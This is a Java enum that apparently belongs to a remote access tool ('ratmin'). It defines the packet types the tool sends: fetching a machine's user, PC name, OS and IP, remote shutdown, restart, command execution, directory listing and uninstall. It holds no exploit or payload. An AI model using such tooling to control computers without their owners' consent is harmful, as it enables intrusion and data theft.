package me.slimig.ratmin.utils.Packets;

public enum Packet {



    PING("PING"),
    CLOSE("CLOSE"),
    USER("USER"),
    PCNAME("PCNAME"),
    OS("OS"),
    IP("IP"),
    SHUTDOWN("SHUTDOWN"),
    RESTART("RESTART"),
    COMMAND("COMMAND"),
    DIR("DIR"),
    UNINSTALL("UNINSTALL");

    private final String packet;
    private static char SPLIT = '\u0000';
    private static boolean canSend;

    Packet(String packet) {
        this.packet = packet;
    }

    public String getPacketID() {
        return this.packet+ SPLIT;
    }

    public static boolean isAbleToSend() {
        return canSend;
    }

    public static void setCanSend(boolean canSend) {
        Packet.canSend = canSend;
    }
}